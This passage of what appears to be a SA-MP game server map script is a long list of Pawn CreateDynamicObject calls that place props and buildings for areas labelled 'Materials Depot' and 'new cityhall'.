	CreateDynamicObject(970,2226.9467800,2086.5632300,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2226.9467800,2088.6001000,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2226.9467800,2089.3601100,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(970,2226.9467800,2091.4199200,99.7138000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1537,2235.0285600,2069.0129400,99.2668000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1537,2233.5485800,2069.0129400,99.2668000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1537,2236.5085400,2069.0129400,99.2668000,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(638,2245.8496100,2079.8164100,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2247.5854500,2076.9675300,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2245.8496100,2076.9643600,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2247.4860800,2079.8164100,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2245.8496100,2086.1499000,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2247.4860800,2086.1499000,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2245.8496100,2088.9765600,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2247.4860800,2088.9765600,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2227.6599100,2077.0053700,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2226.2199700,2077.0043900,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2227.6799300,2079.8444800,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2226.2636700,2079.8344700,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2227.6799300,2086.1472200,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2226.2636700,2086.1472200,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2227.6799300,2088.9799800,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2226.2636700,2088.9799800,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2245.8349600,2083.3168900,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2245.8300800,2082.5957000,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2247.4860800,2082.5957000,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2247.4860800,2083.3168900,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2227.6662600,2083.3669400,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2227.6647900,2082.6877400,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2226.2636700,2082.6877400,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(638,2226.2636700,2083.3669400,99.8757000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2634,2238.7114300,2096.9790000,100.8673000,0.0000000,0.0000000,250.0000000); //
	CreateDynamicObject(3475,2242.1799300,2098.0236800,99.6318000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19446,2236.1201200,2097.5625000,104.4200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(19427,2241.6916500,2097.5625000,104.4200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1649,2241.2399900,2097.7841800,100.9933000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(19377,2236.5583500,2102.3461900,102.6800000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2246.9726600,2092.8232400,106.1200000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2236.5383300,2092.8232400,106.1200000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2246.9387200,2083.2768600,106.1200000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2236.5332000,2083.2556200,106.1200000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2226.2028800,2092.8232400,106.1200000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2226.2233900,2083.2309600,106.1200000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2226.2028800,2073.6208500,106.1200000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2236.5332000,2073.6210900,106.1200000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(19377,2246.9809600,2073.6394000,106.1200000,0.0000000,90.0000000,0.0000000); //
	CreateDynamicObject(2773,2228.9082000,2073.4047900,99.8924000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,2228.9082000,2071.4848600,99.8924000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,2229.5495600,2069.7773400,99.8924000,0.0000000,0.0000000,40.0000000); //
	CreateDynamicObject(2773,2244.5964400,2073.4047900,99.8924000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,2244.5964400,2071.4848600,99.8924000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,2243.9641100,2069.7932100,99.8924000,0.0000000,0.0000000,-40.0000000); //
	CreateDynamicObject(19446,2232.3530300,2097.5625000,100.9200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2004,2233.0354000,2098.0634800,100.2568000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2004,2233.0354000,2099.1835900,100.2568000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2004,2233.0354000,2100.3034700,100.2568000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2004,2233.0354000,2101.3835400,100.2568000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2004,2233.0354000,2102.5034200,100.2568000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2004,2233.0354000,2098.0634800,101.2168000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2004,2233.0354000,2099.1835900,101.2168000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2004,2233.0354000,2100.3034700,101.2168000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2004,2233.0354000,2101.3835400,101.2168000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2004,2233.0354000,2102.5034200,101.2168000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2004,2233.5205100,2104.1472200,100.2568000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2234.6005900,2104.1484400,100.2568000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2235.6606400,2104.1484400,100.2568000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2236.7404800,2104.1484400,100.2568000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2237.8405800,2104.1484400,100.2568000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2238.9206500,2104.1484400,100.2568000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2240.0205100,2104.1484400,100.2568000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2233.5205100,2104.1472200,101.2168000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2234.6005900,2104.1484400,101.2168000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2235.6606400,2104.1484400,101.2168000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2236.7404800,2104.1484400,101.2168000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2237.8405800,2104.1484400,101.2168000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2238.9206500,2104.1484400,101.2168000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2240.0205100,2104.1484400,101.2168000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2004,2241.6796900,2103.6972700,100.2568000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2004,2241.6796900,2102.6572300,100.2568000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2004,2241.6796900,2101.5773900,100.2568000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2004,2241.6796900,2100.5173300,100.2568000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2004,2241.6796900,2099.4372600,100.2568000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2004,2241.6796900,2103.6972700,101.2168000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2004,2241.6796900,2102.6572300,101.2168000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2004,2241.6796900,2101.5773900,101.2168000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2004,2241.6796900,2100.5173300,101.2168000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2004,2241.6796900,2099.4372600,101.2168000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2773,2238.8117700,2081.7946800,99.8924000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,2234.8103000,2083.4531300,99.8924000,0.0000000,0.0000000,-45.0000000); //
	CreateDynamicObject(2773,2236.5344200,2079.5014600,99.8924000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2773,2236.4992700,2084.1123000,99.8924000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2773,2238.1320800,2083.4348100,99.8924000,0.0000000,0.0000000,45.0000000); //
	CreateDynamicObject(2773,2234.1215800,2081.7763700,99.8924000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,2234.8095700,2080.1398900,99.8924000,0.0000000,0.0000000,45.0000000); //
	CreateDynamicObject(2773,2238.1801800,2080.1660200,99.8924000,0.0000000,0.0000000,135.0000000); //
	CreateDynamicObject(2395,2224.1567400,2079.3957500,102.0000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2224.1567400,2075.7595200,102.0000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2224.1560100,2073.8745100,102.0000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2224.1567400,2083.7551300,102.0000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2224.1567400,2087.4729000,102.0000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2224.1560100,2089.2373000,102.0000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2249.2282700,2091.7724600,102.0000000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2395,2224.1560100,2087.4729000,102.0000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2224.1560100,2087.4729000,102.0000000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2249.2282700,2088.0839800,102.0000000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2395,2249.2282700,2084.3784200,102.0000000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2395,2249.2282700,2080.6831100,102.0000000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2395,2249.2282700,2076.9672900,102.0000000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2395,2249.2282700,2076.9672900,104.7200000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2395,2249.2282700,2080.6831100,104.7200000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2395,2249.2282700,2084.3784200,104.7200000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2395,2249.2282700,2088.0839800,104.7200000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2395,2249.2282700,2091.7724600,104.7200000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2395,2224.1560100,2089.2373000,104.7200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2224.1567400,2087.4729000,104.7200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2224.1567400,2083.7551300,104.7200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2224.1567400,2079.3957500,104.7200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2224.1567400,2075.7595200,104.7200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,2224.1560100,2073.8745100,104.7200000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2755,2222.3190900,2073.5722700,100.8000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2755,2222.3190900,2092.3640100,100.8000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2755,2250.9196800,2092.0800800,100.8000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2755,2250.9196800,2073.8034700,100.8000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1649,2224.0966800,2080.7688000,100.5234000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1649,2224.0966800,2076.4523900,100.5234000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1649,2224.0966800,2085.6743200,100.5234000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1649,2224.0966800,2090.0554200,100.5234000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1649,2249.3027300,2089.6103500,100.5234000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1649,2249.2839400,2085.2229000,100.5234000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1649,2249.2839400,2080.3659700,100.5234000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1649,2249.2839400,2075.9726600,100.5234000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(3935,2236.4973100,2081.6323200,101.2552000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2235.4377400,2082.1462400,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2235.4404300,2081.6699200,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2235.4585000,2081.1320800,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2235.4677700,2080.6123000,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2235.9682600,2080.6010700,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2236.4892600,2080.5700700,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2237.0097700,2080.5791000,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2237.4768100,2080.5739700,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2237.5100100,2081.0332000,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2237.5253900,2081.5534700,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2237.5605500,2082.0732400,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2237.5427200,2082.5422400,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2237.0786100,2082.6086400,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2236.6174300,2082.6086400,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2236.0759300,2082.6149900,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2253,2235.5578600,2082.6594200,99.6131000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,2244.5229500,2092.6503900,99.8924000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,2244.5131800,2094.5686000,99.8924000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,2244.9936500,2096.3801300,99.8924000,0.0000000,0.0000000,-30.0000000); //
	CreateDynamicObject(2773,2228.7675800,2092.6001000,99.8924000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,2228.7785600,2094.5102500,99.8924000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2773,2228.7766100,2096.4445800,99.8924000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3440,2236.9204100,2097.6337900,100.2800000,0.0000000,0.0000000,0.0000000); //
	// Materials Depot
	CreateDynamicObject(10844,2135.4228500,-118.1402000,4.0200000,0.0000000,0.0000000,54.0000000); //
	CreateDynamicObject(10847,2121.6547900,-137.5636000,6.2800000,0.0000000,0.0000000,54.0000000); //
	CreateDynamicObject(11244,2118.4023400,-77.4415200,4.0200000,0.0000000,0.0000000,145.0000000); //
	CreateDynamicObject(10846,2109.7109400,-129.6419800,-1.1400000,0.0000000,0.0000000,54.0000000); //
	CreateDynamicObject(10844,2103.3918500,-99.2669000,4.0200000,0.0000000,0.0000000,54.0000000); //
	CreateDynamicObject(10846,2095.2846700,-119.1314700,5.0000000,0.0000000,0.0000000,54.0000000); //
	CreateDynamicObject(6959,2129.2893100,-108.7737700,1.1576000,0.0000000,0.0000000,55.0000000); //
	CreateDynamicObject(6959,2124.5651900,-93.2646000,1.1550000,0.0000000,0.0000000,55.0000000); //
	CreateDynamicObject(6959,2106.8588900,-77.3618000,-16.0000000,90.0000000,0.0000000,55.1000000); //
	CreateDynamicObject(6959,2089.8903800,-101.5231700,-16.0000000,90.0000000,0.0000000,54.0000000); //
	CreateDynamicObject(6959,2139.7675800,-128.1414300,-18.7800000,90.0000000,0.0000000,54.0000000); //
	CreateDynamicObject(6959,2134.6940900,-135.1573000,-18.7800000,90.0000000,0.0000000,54.0000000); //
	CreateDynamicObject(6959,2094.4543500,-130.3951300,-16.0000000,90.0000000,0.0000000,-36.0000000); //
	CreateDynamicObject(6959,2135.9438500,-72.4996600,-18.7000000,90.0000000,0.0000000,-35.0000000); //
	CreateDynamicObject(19641,2147.2143600,-105.5447900,1.1221000,0.0000000,0.0000000,-40.0000000); //
	CreateDynamicObject(19641,2148.8630400,-111.7717900,1.1221000,0.0000000,0.0000000,250.0000000); //
	CreateDynamicObject(19641,2141.2089800,-100.4991100,1.1221000,0.0000000,0.0000000,-40.0000000); //
	CreateDynamicObject(19641,2135.1579600,-95.4064100,1.1221000,0.0000000,0.0000000,-40.0000000); //
	CreateDynamicObject(10252,2129.8020000,-89.9156000,2.7400000,0.0000000,0.0000000,-40.0000000); //
	CreateDynamicObject(19641,2129.0703100,-85.0925400,1.1221000,0.0000000,0.0000000,50.0000000); //
	CreateDynamicObject(19641,2128.5473600,-79.5642400,1.1221000,0.0000000,0.0000000,-40.0000000); //
	CreateDynamicObject(10252,2129.8020000,-89.9156000,4.1400000,0.0000000,0.0000000,-40.0000000); //
	CreateDynamicObject(8613,2109.2900400,-113.3981900,3.8000000,0.0000000,0.0000000,55.0000000); //
	CreateDynamicObject(3577,2117.8501000,-90.0348900,1.8383000,0.0000000,0.0000000,80.0000000); //
	CreateDynamicObject(3577,2116.6518600,-85.3433000,1.8383000,0.0000000,0.0000000,20.0000000); //
	CreateDynamicObject(3577,2113.5036600,-88.9246000,1.8383000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3577,2119.1706500,-115.2749700,1.8383000,0.0000000,0.0000000,40.0000000); //
	CreateDynamicObject(3577,2116.6701700,-103.6722200,1.8383000,0.0000000,0.0000000,20.0000000); //
	CreateDynamicObject(3577,2128.2104500,-104.8575300,1.8383000,0.0000000,0.0000000,80.0000000); //
    // new cityhall
    CreateDynamicObject(2395,357.8758900,158.4844100,1010.0983900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,357.8758900,162.2215000,1010.0983900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,357.8758900,165.9647100,1010.0983900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,357.8758900,169.6866000,1010.0983900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,357.8758900,173.4084000,1010.0983900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,357.8758900,177.1225000,1010.0983900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,357.8758900,180.8506900,1010.0983900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,357.8758900,184.5794100,1010.0983900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2395,357.8758900,188.3015000,1010.0983900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1649,357.8244000,160.2928000,1008.5045200,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1649,357.8244000,164.7215000,1008.5045200,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1649,357.8244000,169.1508000,1008.5045200,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1649,357.8244000,187.1959100,1008.5045200,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1649,357.8244000,182.7578000,1008.5045200,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1649,357.8244000,178.3327900,1008.5045200,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2773,362.6191700,172.1601900,1007.8801900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2773,362.6463900,175.3616500,1007.8801900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2773,364.5317100,172.1684300,1007.8801900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2773,364.6068400,175.3476700,1007.8801900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(3935,373.8525100,173.7632000,1008.4032000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2001,376.9922200,167.1002500,1007.3549800,3.1416000,0.0000000,2.3562000); //
	CreateDynamicObject(1703,371.5090000,188.9238000,1007.3549800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1776,370.4026500,189.2926300,1008.4765600,356.8584000,0.0000000,-3.1415900); //
	CreateDynamicObject(2002,369.4570000,188.9417000,1007.3750000,356.8584000,0.0000000,3.1415900); //
	CreateDynamicObject(1703,375.2303500,188.7314600,1007.3549800,0.0000000,0.0000000,-50.0000000); //
	CreateDynamicObject(2001,374.4755600,188.9072400,1007.3750000,3.1415900,0.0000000,2.3561900); //
	CreateDynamicObject(2001,365.5258500,177.6959400,1007.3750000,3.1415900,0.0000000,2.3561900); //
	CreateDynamicObject(2001,365.6099200,170.1510200,1007.3750000,3.1415900,0.0000000,2.3561900); //
	CreateDynamicObject(2614,357.9721100,173.8120000,1011.0872200,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1714,359.1048000,173.9045000,1007.3828100,3.1416000,0.0000000,90.0000000); //
	CreateDynamicObject(2190,360.5098000,174.5502900,1008.1016200,356.8584000,0.0000000,-90.0000000); //
	CreateDynamicObject(2190,360.4952100,173.3618000,1008.1016200,356.8584000,0.0000000,-140.0000000); //
	CreateDynamicObject(1703,376.8806200,182.8179000,1007.3350200,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1703,376.9117100,186.2178600,1007.3350200,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(2010,377.0655200,186.8177600,1007.3750000,3.1415900,0.0000000,2.3561900); //
	CreateDynamicObject(2001,376.9101000,183.5232200,1007.3750000,3.1415900,0.0000000,2.3561900); //
	CreateDynamicObject(11691,372.8557100,183.6658000,1007.1234700,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(3440,364.5494100,177.5133100,1005.8400300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3440,364.5494100,177.5133100,1010.5999800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3440,364.5336000,170.0416000,1005.8400300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3440,364.5336000,170.0416000,1010.5999800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3440,373.9444000,177.4892000,1005.8400300,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3440,373.9444000,177.4892000,1010.5999800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3440,373.9255100,170.0125000,1010.5999800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3440,373.9255100,170.0125000,1005.8599900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1533,365.7639200,196.1237300,1007.3830600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(11729,364.4794900,195.7346000,1007.3826900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(11729,365.1116900,195.7000000,1007.3826900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(11729,365.7838100,195.7346000,1007.3826900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(11729,366.4238000,195.7346000,1007.3826900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(11729,367.0878000,195.7346000,1007.3826900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(11729,367.7550000,195.7346000,1007.3826900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(11729,368.4306000,195.7346000,1007.3826900,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2596,364.2311100,190.3985000,1009.0800200,0.0000000,0.0000000,120.0000000); //
	CreateDynamicObject(1574,368.4366800,190.3915900,1007.3629200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1574,364.3368200,190.3645500,1007.3629200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1216,363.3620000,189.1698000,1008.0211800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1216,362.7818900,189.1808000,1008.0211800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1216,362.2204000,189.1700000,1008.0211800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1216,361.6604900,189.1810800,1008.0211800,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1502,371.2450900,166.6496000,1007.3950200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1533,370.8041100,179.0992700,1013.1828600,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(1533,369.2266500,161.5402400,1013.1829200,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2637,340.3059100,165.1931000,1018.9827900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2637,340.3059100,163.2321000,1018.9827900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(2637,340.3059100,161.2321000,1018.9827900,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1663,339.1033000,164.7068900,1019.3822000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1663,339.1033000,163.4189000,1019.3822000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1663,339.1033000,162.0421000,1019.3822000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1663,339.1033000,160.6972000,1019.3822000,0.0000000,0.0000000,90.0000000); //
	CreateDynamicObject(1663,339.1033300,166.0490600,1019.3822000,0.0000000,0.0000000,80.0000000); //
	CreateDynamicObject(1663,160.6999100,1019.3822000,1019.3822000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1663,341.7372100,160.6972000,1019.3822000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1663,341.7372100,162.0421000,1019.3822000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1663,341.7372100,163.4189000,1019.3822000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1663,341.7372100,164.7068900,1019.3822000,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1663,341.7372100,166.0491000,1019.3822000,0.0000000,0.0000000,-80.0000000); //
	CreateDynamicObject(2614,340.2977900,159.8286000,1021.7199700,0.0000000,0.0000000,180.0000000); //
	CreateDynamicObject(1703,371.5112000,169.8152000,1018.9766200,3.1416000,0.0000000,180.0000000); //
	CreateDynamicObject(1703,373.1395000,175.4781000,1018.9766200,0.0000000,0.0000000,-90.0000000); //
	CreateDynamicObject(1703,371.7842100,178.2435200,1018.9766200,356.8584000,0.0000000,-50.0000000); //
	CreateDynamicObject(2001,373.5306400,176.2041200,1018.9765600,3.1415900,0.0000000,2.3561900); //
	CreateDynamicObject(2002,368.5907000,178.4993900,1018.9765600,356.8584000,0.0000000,3.1415900); //
	CreateDynamicObject(2002,369.1137400,178.4810000,1018.9765600,356.8584000,0.0000000,3.1415900); //
	CreateDynamicObject(1776,370.2112100,178.6434500,1020.0703100,356.8584000,0.0000000,-3.1415900); //
	CreateDynamicObject(1703,373.2157900,172.2510100,1018.9766200,356.8584000,0.0000000,-90.0000000); //
	CreateDynamicObject(2001,373.2568100,172.8223600,1018.9765600,3.1415900,0.0000000,2.3561900); //
	CreateDynamicObject(2001,368.7000100,169.4998600,1018.9765600,3.1415900,0.0000000,2.3561900); //
	CreateDynamicObject(3440,364.7331800,173.8985000,1021.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3440,347.3225700,173.8954000,1021.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(3440,329.0777000,173.8902000,1021.0000000,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2614,354.9625900,175.5623000,1027.2757600,0.0400000,0.0000000,0.0000000); //
	CreateDynamicObject(2395,355.4780000,175.6069900,1025.3159200,0.0000000,0.0000000,0.0000000); //
	CreateDynamicObject(2395,351.7575100,175.6069900,1025.3159200,0.0000000,0.0000000,0.0000000); //
